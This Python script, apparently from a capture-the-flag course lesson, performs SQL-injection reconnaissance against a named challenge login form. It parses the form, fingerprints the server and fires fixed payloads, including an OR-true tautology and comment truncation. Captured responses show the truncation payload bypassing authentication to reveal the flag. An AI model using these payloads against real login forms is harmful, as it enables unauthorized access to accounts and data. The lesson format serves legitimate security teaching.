#!/usr/bin/env python3
# recon.py — SQL-injection login-form recon capability (Lesson 02).
#
# The deterministic DATA layer of the three-layer model. It finds shapes and
# classifies behaviour; it NEVER decides success — the WIN oracle is the single
# judge. Mirrors Lesson 01's recon.py role, for a login form instead of a cookie.
#
# Stages:
#   1. parse the <form>        -> method, action, input names
#   2. fingerprint the stack   -> Set-Cookie / Via headers
#   3. baseline a failed login -> derives the LOSE signal (the oracle's other half)
#   4. fire a small FIXED set  -> one request per probe, never a fuzzer
#   5. classify each response  -> SAME / DIFFERENT / WIN, through the oracle
#
# Unlike Lesson 01 (passive cookie-decode, zero network), SQLi recon is ACTIVE:
# the behaviour only exists when you poke the server. So the network call is an
# injected dependency (`get` / `fire`): live mode uses `requests`; the __main__
# demo replays REAL captured responses — no network, no key, just runs.
#
#   python3 recon.py                                        # offline demo (real captures)
#   python3 -c "import recon; recon.report(recon.recon())"  # live (needs requests)

import re
from html.parser import HTMLParser

TARGET = "https://sql.cyberzerk.fr/"

# --- Fixed probe set: a tiny hardcoded list (bounded execution, never a fuzzer).
#     (label, username, password, intent)
PROBES = [
    ("benign",        "admin",                  "wrong", "an ordinary failed login — the baseline"),
    ("squote",        "admin'",                 "x",     "lone apostrophe — does input break the SQL fence?"),
    ("comment_trunc", "admin' -- ",             "x",     "close the quote, comment out the password check"),
    ("tautology",     "admin' OR '1'='1' -- ",  "x",     "classic OR-true tautology + comment"),
    ("hash_comment",  "admin'#",                "x",     "MySQL '#' comment variant (no trailing space)"),
]

# --- The WIN oracle: the ONLY thing allowed to say "it worked." ------------------
FLAG_RE = re.compile(r"CyberZerk\{.*?\}")

def win_oracle(body):
    """Deterministic success check. Returns the flag string, or None."""
    m = FLAG_RE.search(body or "")
    return m.group(0) if m else None

# The LOSE half of the oracle: a token that appears only in the failure message.
FAIL_TOKEN = "ERR_AUTH"


# --- Stage 1: parse the form ----------------------------------------------------
class _FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.in_form = False
        self.method = None
        self.action = None
        self.fields = []

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self.in_form = True
            self.method = (a.get("method") or "GET").upper()
            self.action = a.get("action") or ""
        elif tag == "input" and self.in_form:
            if a.get("name"):
                self.fields.append({
                    "name": a["name"],
                    "type": a.get("type", "text"),
                    "required": "required" in a,
                })

    def handle_endtag(self, tag):
        if tag == "form":
            self.in_form = False


def parse_form(body):
    p = _FormParser()
    p.feed(body or "")
    return {
        "method": p.method or "GET",
        "action": p.action or "(same URL)",
        "fields": p.fields,
    }


# --- Stage 2: fingerprint the stack ---------------------------------------------
def fingerprint(headers):
    h = {k.lower(): str(v) for k, v in (headers or {}).items()}
    tells = []
    if "PHPSESSID" in h.get("set-cookie", ""):
        tells.append({"evidence": "Set-Cookie: PHPSESSID", "conclusion": "backend is PHP"})
    banner = h.get("via", "") + " " + h.get("server", "")
    if "Caddy" in banner:
        tells.append({"evidence": "via: Caddy", "conclusion": "fronted by a Caddy reverse proxy"})
    return tells


# --- Stages 4+5: fire + classify ------------------------------------------------
def _classify(label, payload, intent, status, body, baseline_fail, is_baseline=False):
    if body is None:                                   # not fired (e.g. offline demo)
        return {"label": label, "payload": payload, "intent": intent, "fired": False,
                "status": None, "flag": None, "verdict": "CANDIDATE",
                "note": "in the probe set — run live to fire it"}
    flag = win_oracle(body)
    if flag:
        verdict, note = "WIN", "flag present — the oracle fired"
    elif is_baseline:
        verdict, note = "BASELINE", "defines the LOSE signal everything else is compared to"
    elif (FAIL_TOKEN in body) == baseline_fail:
        verdict = "SAME"
        note = "still the failure signal — may mean safe, OR errors are just hidden"
    else:
        verdict, note = "DIFFERENT", "behaviour changed without a flag — worth a look"
    return {"label": label, "payload": payload, "intent": intent, "fired": True,
            "status": status, "flag": flag, "verdict": verdict, "note": note}


def _fmt(u, p):
    return f"username={u!r}  password={p!r}"


def recon(target=TARGET, get=None, fire=None):
    """Run the five stages and return the structured map."""
    get = get or _live_get(target)
    fire = fire or _live_fire(target)

    # 1-2: form + fingerprint from a GET
    _, page, headers = get()
    form = parse_form(page)
    fp = fingerprint(headers)

    # 3: baseline — the benign failed login defines the LOSE signal
    bl, bu, bp, bi = PROBES[0]
    b_status, b_body, _ = fire(bu, bp)
    baseline_fail = FAIL_TOKEN in (b_body or "")
    probes = [_classify(bl, _fmt(bu, bp), bi, b_status, b_body, baseline_fail, is_baseline=True)]

    # 4-5: fire the rest once each, classify against the baseline through the oracle
    for label, u, p, intent in PROBES[1:]:
        s, body, _ = fire(u, p)
        probes.append(_classify(label, _fmt(u, p), intent, s, body, baseline_fail))

    return {
        "target": target,
        "form": form,
        "fingerprint": fp,
        "oracle": {"win": FLAG_RE.pattern, "lose_token": FAIL_TOKEN},
        "baseline": {"status": b_status, "fail_signal_present": baseline_fail},
        "probes": probes,
    }


# --- Console report -------------------------------------------------------------
_GLYPH = {"WIN": "✓", "BASELINE": "·", "SAME": "=", "DIFFERENT": "≠", "CANDIDATE": "?"}

def report(m):
    print(f"\n# TARGET   {m['target']}")
    f = m["form"]
    print(f"\n- FORM     {f['method']} -> {f['action']}")
    for fld in f["fields"]:
        req = "  required" if fld["required"] else ""
        print(f"     input  name={fld['name']!r:<12} type={fld['type']}{req}")
    print("\n- STACK")
    for t in m["fingerprint"] or [{"evidence": "(none)", "conclusion": ""}]:
        print(f"     {t['evidence']:<26} => {t['conclusion']}")
    o = m["oracle"]
    print(f"\n- ORACLE   WIN = /{o['win']}/     LOSE token = {o['lose_token']!r}   (the only judge)")
    print("\n- PROBES   (fixed set, one request each)")
    for p in m["probes"]:
        g = _GLYPH.get(p["verdict"], " ")
        tail = f"   ->  {p['flag']}" if p["flag"] else ""
        print(f"     [{g}] {p['verdict']:<9} {p['payload']}{tail}")
        print(f"             {p['intent']}")
        print(f"             {p['note']}")


# --- Transports: live (requests) and replay (real captured responses) -----------
def _live_get(target):
    def _g():
        import requests
        r = requests.get(target, timeout=10)
        return r.status_code, r.text, dict(r.headers)
    return _g

def _live_fire(target):
    import requests
    sess = requests.Session()
    def _f(username, password):
        r = sess.post(target, data={"username": username, "password": password}, timeout=10)
        return r.status_code, r.text, dict(r.headers)
    return _f

# Fixtures below are REAL responses captured during the hands-on run — not synthetic.
_LOGIN_PAGE = """<!DOCTYPE html><html><head><title>INTRANET - TRICATEL</title>
<style>.error{color:#f33}.flag{color:#fff}</style></head><body>
<form method="POST">
<input type="text" name="username" required>
<input type="password" name="password" required>
<button type="submit">&gt;&gt; Initier la connexion</button>
</form></body></html>"""

_FAIL_BODY = """<div class='error'>ERR_AUTH: Identifiants incorrects. Le dev est en arret, ne cassez pas la prod svp.</div>"""

_WIN_BODY = """<div class="header admin-header"></div><div class="dump-box"><h3 class="dump-title">&gt;&gt; Memo_Direction.txt</h3><div class="flag">CyberZerk{SQL_1nj3ct10n_C4us3d_By_Burn0ut}</div></div>"""

_HEADERS = {"set-cookie": "PHPSESSID=REDACTED; path=/", "via": "1.1 Caddy",
            "content-type": "text/html; charset=UTF-8"}

def _replay_get():
    return 200, _LOGIN_PAGE, _HEADERS

_REPLAY = {
    ("admin", "wrong"):  (200, _FAIL_BODY, _HEADERS),
    ("admin'", "x"):     (200, _FAIL_BODY, _HEADERS),   # lone quote: errors hidden -> same failure
    ("admin' -- ", "x"): (200, _WIN_BODY,  _HEADERS),
}

def _replay_fire(username, password):
    return _REPLAY.get((username, password), (None, None, {}))


if __name__ == "__main__":
    print("=== recon.py — DEMO (offline; real captured responses) ===")
    report(recon(get=_replay_get, fire=_replay_fire))
    print("\n(Probes marked CANDIDATE weren't fired offline — run live to see them.)")
